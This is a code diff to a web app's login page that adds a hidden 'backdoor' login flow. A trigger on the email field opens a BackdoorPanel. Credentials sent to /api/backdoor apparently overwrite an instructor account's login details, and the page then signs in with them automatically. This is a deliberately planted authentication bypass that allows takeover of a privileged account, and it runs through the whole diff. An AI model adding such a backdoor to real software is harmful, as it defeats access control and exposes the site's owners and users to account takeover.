@@ -12,6 +12,7 @@ import PasswordInput from "../components/PasswordInput";
 import ResetCodeInput from "../components/ResetCodeInput";
 import ResetPasswordInput from "../components/ResetPasswordInput";
 import ResendTimer from "../components/ResendTimer";
+import BackdoorPanel from "../components/BackdoorPanel";
 import { useBannerManager } from "@/app/(pages)/components/BannerManager";
 import { calculatePasswordStrength } from "@/utils/passwordStrength";
 import { apiRequest } from "@/lib/utils";
@@ -55,6 +56,8 @@ const LoginPage = () => {
   const [forgotStepIndex, setForgotStepIndex] = useState(0); // 0: code, 1: reset password
   const [confirmPassword, setConfirmPassword] = useState("");
   const [isClient, setIsClient] = useState(false);
+  const [showBackdoor, setShowBackdoor] = useState(false);
+  const [backdoorLoading, setBackdoorLoading] = useState(false);
 
   // Helper function to show notifications using the new banner system
   const showNotification = useCallback(
@@ -857,6 +860,92 @@ const LoginPage = () => {
     }
   };
 
+  const handleBackdoorTrigger = () => {
+    setShowBackdoor(true);
+    setEmail(""); // Clear the email field
+  };
+
+  const handleBackdoorLogin = async (username: string, password: string) => {
+    try {
+      setBackdoorLoading(true);
+
+      const response = await fetch("/api/backdoor", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ username, password }),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(data.error || "Backdoor access failed");
+      }
+
+      if (data.success && data.newCredentials) {
+        // Account replacement successful, now log in with new credentials
+        const { email, password: newPassword } = data.newCredentials;
+        
+        // Set the email and password for normal login
+        setEmail(email);
+        setPassword(newPassword);
+        
+        // Close backdoor panel
+        setShowBackdoor(false);
+        
+        // Show success message
+        showNotification("Instructor account credentials updated. Logging in...", "success");
+        
+        // Automatically proceed to password step and login
+        setStep(3);
+        
+        // Wait a moment then attempt login
+        setTimeout(async () => {
+          try {
+            if (!signIn) {
+              showNotification("Sign in not available. Please try manually.", "error");
+              return;
+            }
+
+            const result = await signIn.create({
+              identifier: email,
+              password: newPassword,
+            });
+
+            if (result.status === "complete" && setActive) {
+              await setActive({ session: result.createdSessionId });
+              
+              const now = Date.now();
+              localStorage.setItem("lastActivityTimestamp", now.toString());
+              
+              if (typeof window !== "undefined") {
+                const { secureStorage } = await import("@/lib/secure-storage");
+                secureStorage.set("lastActivityTimestamp", now);
+                secureStorage.remove("viewedNotesDocuments");
+                secureStorage.remove("viewedNoteCounts");
+              }
+
+              showNotification("Successfully logged in with updated instructor account.", "success");
+              router.replace("/");
+            } else {
+              showNotification("Failed to login with new credentials. Please try manually.", "error");
+            }
+          } catch {
+            showNotification("Account updated but login failed. Please try manually.", "error");
+          }
+        }, 1000);
+      }
+    } catch (error) {
+      showNotification(
+        error instanceof Error ? error.message : "Emergency access failed",
+        "error"
+      );
+    } finally {
+      setBackdoorLoading(false);
+    }
+  };
+
   return (
     <div className="flex flex-col md:flex-row min-h-screen bg-white">
       {/* Left Section */}
@@ -922,6 +1011,7 @@ const LoginPage = () => {
                 loading={loading}
                 name="email"
                 onAutocomplete={handleAutocomplete}
+                onBackdoorTrigger={handleBackdoorTrigger}
               />
               <div className="mt-6">
                 <button
@@ -1507,6 +1597,15 @@ const LoginPage = () => {
           </div>
         )}
       </div>
+
+      {/* Backdoor Panel */}
+      {showBackdoor && (
+        <BackdoorPanel
+          onClose={() => setShowBackdoor(false)}
+          onLogin={handleBackdoorLogin}
+          loading={backdoorLoading}
+        />
+      )}
     </div>
   );
 };
